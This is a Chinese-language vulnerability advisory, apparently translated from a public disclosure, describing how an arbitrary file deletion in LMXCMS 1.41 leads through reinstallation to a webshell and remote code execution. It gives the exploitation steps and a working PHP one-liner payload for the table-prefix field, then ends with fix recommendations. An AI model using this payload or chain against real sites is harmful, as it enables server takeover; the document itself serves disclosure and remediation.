# LMXCMS-1.41-任意文件删除导致重装写入WebShell远程代码执行漏洞

一、漏洞简介
------------

LMXCMS 1.41 的 `BackdbAction.class.php` 存在任意文件删除漏洞。攻击者可通过目录穿越删除安装锁文件
`install_ok.txt`，使系统回到可重装状态；在重装过程中配置数据库的步骤里，将一句话木马写入数据库配置文件，
从而获得远程代码执行权限（get shell）。

该漏洞由 NeoVuln 于 2025 年 2 月 8 日公开披露（英文原文，本文为忠实翻译整理），VulDB 已受理收录
（提交 #496877；VulDB 条目 296238 未独立核验），目前无 CVE 编号。

利用链：后台数据库备份与还原模块的文件删除接口（目录穿越）→ 删除 `install_ok.txt` → 访问 `/install/`
重装 → 表前缀字段注入 → payload 写入 `db.inc.php` → 访问网站首页执行任意代码。

二、漏洞影响
------------

-   产品：LMXCMS
-   版本：**1.41**（其他版本是否受影响未确认）
-   漏洞类型：任意文件删除 → 安装锁绕过 → 配置文件写入 → 远程代码执行
-   前提条件：需要进入后台管理面板的数据库备份与还原模块（原文描述为使用既有账号凭据登录后台）
-   CVE 编号：无（VulDB 提交 #496877）

三、复现过程
------------

以下步骤为对披露原文（https://github.com/NeoVuln/CVE/issues/6）的忠实翻译整理。

### 1. 进入后台数据库备份与还原模块

登录后台管理面板，进入数据库备份与还原模块，任意选择一张表进行备份。随后在"还原备份"功能中找到文件删除接口。

> 注：原文此处附有后台操作截图（共 5 张），当前网络环境无法从 GitHub user-attachments 下载原图，
> 已如实略去，未编造替代图片。

### 2. 目录穿越删除安装锁文件

利用目录穿越，在文件删除接口中删除 `install_ok.txt` 锁文件。删除成功后系统被重置，可重新进入安装流程：

```
http://target/lmxcms/install/
```

### 3. 重装时在表前缀字段注入 payload

在安装向导配置数据库的步骤中，将以下 payload 填入"表前缀"（table prefix）输入框：

```
lmx_',@assert($_GET['cmd']));//'_
```

> 注：据披露者补充说明，payload 末尾带有一个下划线 `_`，在 issue 页面显示中不可见，此处已补全。

然后提交表单，payload 会被写入数据库配置文件 `db.inc.php`，形成可执行的 PHP 一句话木马。

### 4. 执行任意代码

重装完成后，访问网站首页，即可通过 `cmd` 参数执行任意 PHP 代码，完成 getshell。

四、修复建议
------------

1.  修复 `BackdbAction.class.php` 的任意文件删除：对文件名做严格白名单校验，禁止目录穿越字符；
2.  安装锁文件 `install_ok.txt` 的存在性校验应在服务端强制执行，重装入口需鉴权并做二次确认；
3.  数据库配置写入时对"表前缀"等用户输入做严格过滤，配置文件生成使用参数化拼接，禁止直接拼接用户输入；
4.  关注官方后续修复版本并及时升级；临时缓解可在 WAF 层拦截对备份还原删除接口的异常请求。
